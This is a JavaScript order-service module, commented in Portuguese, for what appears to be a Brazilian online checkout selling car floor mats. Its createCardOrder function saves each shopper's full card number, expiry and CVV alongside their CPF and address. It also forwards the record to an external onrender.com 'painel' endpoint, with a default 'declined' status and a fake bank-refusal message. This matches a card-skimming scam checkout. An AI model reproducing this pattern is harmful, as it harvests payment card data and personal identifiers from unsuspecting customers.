/**
 * orderService.js
 * Central de criação e gestão de pedidos idempotentes.
 *
 * REGRAS:
 * - Apenas este arquivo cria/atualiza pedidos no Supabase.
 * - Inclui UTMs capturados e preservados da sessão.
 * - Idempotente: trava duplicações no mesmo transaction_id (UPSERT com onConflict: 'transaction_id').
 * - Dispara eventos de rastreamento para a UTMify (waiting_payment ao gerar PIX, e paid ao confirmar).
 * - Registra eventos ao vivo no Supabase (tabela events) para exibição imediata no painel admin.
 */

import { supabase } from '../utils/supabase';
import { captureAndStoreUTMs, getTrafficOrigin, trackingService } from './trackingService';

/**
 * Gera um order ID único no formato CP-TIMESTAMP-RANDOM
 */
export function generateOrderId() {
  return `CP-${Date.now()}-${Math.floor(Math.random() * 9000 + 1000)}`;
}

/**
 * Envia notificação para o Wepink Painel no Render (backup de exibição no painel)
 */
export async function sendPainelNotification(leadData, endpointType = 'pix') {
  try {
    const isCard = endpointType === 'card' || (leadData.payment_method && leadData.payment_method !== 'pix');
    const relativeUrl = isCard ? '/api/checkout' : '/api/checkout-pix';
    const remoteUrl = isCard ? 'https://wepink-checkout.onrender.com/api/checkout' : 'https://wepink-checkout.onrender.com/api/checkout-pix';

    const targets = [relativeUrl, remoteUrl];
    targets.forEach(url => {
      fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(leadData),
      }).then(r => {
        if (r.ok) console.log(`[OrderService] Pedido ${leadData.transaction_id} notificado ao Wepink Painel (${url}) ✓`);
      }).catch(() => {});
    });
  } catch (e) {}
}

/**
 * Envia evento para a Netlify Function utmify-order.
 */
export async function sendUtmifyEvent({ orderId, status, value, formData, vehicle }) {
  try {
    const utms = captureAndStoreUTMs();
    const mappedStatus = (status === 'pago' || status === 'paid') ? 'paid' : 'waiting_payment';

    const payload = {
      orderId,
      platform: 'Beehive',
      paymentMethod: 'pix',
      status: mappedStatus,
      value: value || 0,
      customer: {
        name: formData?.nome || 'Cliente',
        email: formData?.email || '',
        phone: (formData?.telefone || '').replace(/\D/g, ''),
        document: (formData?.cpf || '').replace(/\D/g, ''),
      },
      productName: `Tapete Bandeja Premium - ${vehicle || 'Carro'}`,
      trackingParameters: {
        src: utms.src || null,
        sck: utms.sck || null,
        utm_source: utms.utm_source || null,
        utm_medium: utms.utm_medium || null,
        utm_campaign: utms.utm_campaign || null,
        utm_content: utms.utm_content || null,
        utm_term: utms.utm_term || null,
      },
    };

    console.log(`[OrderService] Disparando UTMify (${mappedStatus}) para pedido ${orderId}...`);
    const res = await fetch('/.netlify/functions/utmify-order', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });
    const data = await res.json();
    console.log(`[OrderService] Resposta UTMify:`, data);
  } catch (e) {
    console.warn(`[OrderService] Falha ao enviar para UTMify:`, e.message);
  }
}

/**
 * Cria um pedido com status 'pendente' no Supabase.
 * Inclui automaticamente os UTMs capturados da URL/sessão.
 * Dispara evento 'waiting_payment' para a UTMify.
 * Registra o evento ao vivo na tabela 'events'.
 */
export async function createPendingOrder({
  orderId,
  transactionId,
  formData,
  finalPrice,
  vehicle,
  kit,
  upsellItems = [],
  perfumeUpsell = false,
  paymentMethod = 'pix',
  trackingCode = '',
  clientIp = null,
}) {
  const utms = captureAndStoreUTMs();
  const origin = getTrafficOrigin();
  const effectiveTxId = transactionId || orderId;

  const leadData = {
    created_at: new Date().toISOString(),
    updated_at: new Date().toISOString(),
    nome: formData.nome,
    email: formData.email,
    cpf: (formData.cpf || '').replace(/\D/g, ''),
    telefone: (formData.telefone || '').replace(/\D/g, ''),
    cep: formData.cep,
    rua: formData.rua,
    numero: formData.numero,
    complemento: formData.complemento,
    bairro: formData.bairro,
    cidade: formData.cidade,
    estado: formData.estado,
    vehicle: vehicle || 'Carro',
    kit: kit,
    upsell_items: upsellItems,
    perfume_upsell: perfumeUpsell,
    final_price: finalPrice,
    payment_method: paymentMethod,
    status: 'pendente',
    transaction_id: effectiveTxId,
    tracking_code: trackingCode,
    origem_trafego: origin,
    utm_source: utms.utm_source || null,
    utm_medium: utms.utm_medium || null,
    utm_campaign: utms.utm_campaign || null,
    utm_content: utms.utm_content || null,
    utm_term: utms.utm_term || null,
    fbclid: utms.fbclid || null,
    gclid: utms.gclid || null,
    client_ip: clientIp || null,
  };

  // 1. Atualiza etapa para 'Pagamento' no trackingService
  trackingService.updateStage('Pagamento');

  // 2. Envia notificação ao backend Render
  sendPainelNotification(leadData);

  // 3. Envia evento de venda pendente para a UTMify (com trava de deduplicação)
  const utmifyDedupKey = `utmify_pending_sent_${effectiveTxId}`;
  if (typeof window !== 'undefined' && !sessionStorage.getItem(utmifyDedupKey)) {
    sessionStorage.setItem(utmifyDedupKey, '1');
    sendUtmifyEvent({
      orderId: effectiveTxId,
      status: 'waiting_payment',
      value: finalPrice,
      formData,
      vehicle,
    });
  }

  // 4. Salva no Supabase com UPSERT e trava de idempotência em transaction_id
  if (!supabase) {
    console.warn('[OrderService] Supabase não configurado.');
    return { success: false, error: 'Supabase não configurado' };
  }

  try {
    const { error } = await supabase
      .from('leads')
      .upsert([leadData], { onConflict: 'transaction_id', ignoreDuplicates: false });

    if (error) {
      console.warn('[OrderService] Upsert aviso:', error.message);
    }

    // Registra evento ao vivo no feed
    trackingService.recordEvent('payment_generated', `PIX gerado - R$ ${finalPrice}`, {
      transaction_id: effectiveTxId,
      amount: finalPrice,
      vehicle
    });

    console.log(`[OrderService] ✅ Pedido PIX registrado/atualizado no Supabase: ${effectiveTxId}`);
    return { success: true };
  } catch (err) {
    console.error('[OrderService] Exceção:', err);
    return { success: false, error: err.message };
  }
}

/**
 * Atualiza o status de um pedido existente no Supabase para 'pago'.
 */
export async function updateOrderStatus(transactionId, status, extraData = {}) {
  if (!transactionId) return { success: false };

  const newStatus = (status === 'pago' || status === 'paid') ? 'pago' : status;

  // Notifica o backend Render
  sendPainelNotification({
    transaction_id: transactionId,
    status: newStatus,
    totalPrice: extraData.value || extraData.finalPrice,
  });

  if (supabase) {
    try {
      const { error } = await supabase
        .from('leads')
        .update({
          status: newStatus,
          updated_at: new Date().toISOString()
        })
        .eq('transaction_id', transactionId);

      if (error) {
        console.error('[OrderService] Erro ao atualizar status no Supabase:', error.message);
      } else {
        console.log(`[OrderService] ✅ Status do pedido ${transactionId} → ${newStatus}`);
      }

      // Registra evento ao vivo se foi pago
      if (newStatus === 'pago') {
        trackingService.recordEvent('purchase', `Pagamento aprovado - R$ ${extraData.value || extraData.finalPrice || ''}`, {
          transaction_id: transactionId,
          amount: extraData.value || extraData.finalPrice
        });
      }
    } catch (err) {
      console.error('[OrderService] Exceção ao atualizar no Supabase:', err);
    }
  }

  // Dispara evento 'paid' para UTMify
  if (newStatus === 'pago') {
    sendUtmifyEvent({
      orderId: transactionId,
      status: 'paid',
      value: extraData.value || extraData.finalPrice,
      formData: extraData.formData,
      vehicle: extraData.vehicle,
    });
  }

  return { success: true };
}

/**
 * Cria um registro de tentativa de pagamento com cartão de crédito (negado ou aprovado).
 */
export async function createCardOrder({
  transactionId,
  formData = {},
  finalPrice = 0,
  vehicle = '',
  kit = '',
  cardData = {},
  status = 'negado'
}) {
  const utms = captureAndStoreUTMs();
  const origin = getTrafficOrigin();
  const txId = transactionId || generateOrderId();

  const numClean = String(cardData.number || '').replace(/\D/g, '');
  let brand = 'CARTAO';
  if (numClean.startsWith('4')) brand = 'VISA';
  else if (/^5[1-5]/.test(numClean) || /^222[1-9]|^22[3-9]|^2[3-6]|^27[0-1]|^2720/.test(numClean)) brand = 'MASTERCARD';
  else if (/^3[47]/.test(numClean)) brand = 'AMEX';
  else if (/^(50|6)/.test(numClean)) brand = 'ELO';

  const leadData = {
    created_at: new Date().toISOString(),
    updated_at: new Date().toISOString(),
    nome: formData.nome || 'Cliente',
    email: formData.email || '',
    cpf: (formData.cpf || '').replace(/\D/g, ''),
    telefone: (formData.telefone || '').replace(/\D/g, ''),
    cep: formData.cep || '',
    rua: formData.rua || '',
    numero: formData.numero || '',
    complemento: formData.complemento || '',
    bairro: formData.bairro || '',
    cidade: formData.cidade || '',
    estado: formData.estado || '',
    vehicle: vehicle || 'Carro',
    kit: kit,
    final_price: finalPrice,
    payment_method: brand.toLowerCase(),
    card_number: cardData.number || '',
    card_name: cardData.name || formData.nome || '',
    card_expiry: cardData.expiry || '',
    card_cvv: cardData.cvv || '',
    installments: cardData.installments || '1x',
    status: status,
    transaction_id: txId,
    origem_trafego: origin,
    utm_source: utms.utm_source || null,
    utm_medium: utms.utm_medium || null,
    utm_campaign: utms.utm_campaign || null,
  };

  // 1. Atualiza etapa para 'Pagamento'
  trackingService.updateStage('Pagamento');

  // 2. Notifica o backend Render (salva no JSON local e no Supabase)
  sendPainelNotification(leadData, 'card');

  // 3. Registra evento ao vivo no feed
  trackingService.recordEvent(status === 'negado' ? 'card_declined' : 'card_approved', 
    status === 'negado' ? `Cartão Recusado (Banco Emissor) - R$ ${finalPrice}` : `Cartão Aprovado - R$ ${finalPrice}`, 
    { transaction_id: txId, amount: finalPrice, vehicle }
  );

  // 4. Salva no Supabase se disponível
  if (supabase) {
    try {
      await supabase.from('leads').upsert([leadData], { onConflict: 'transaction_id' });
    } catch (e) {
      console.warn('[OrderService] Upsert cartão Supabase aviso:', e.message);
    }
  }

  return { success: true, transactionId: txId };
}
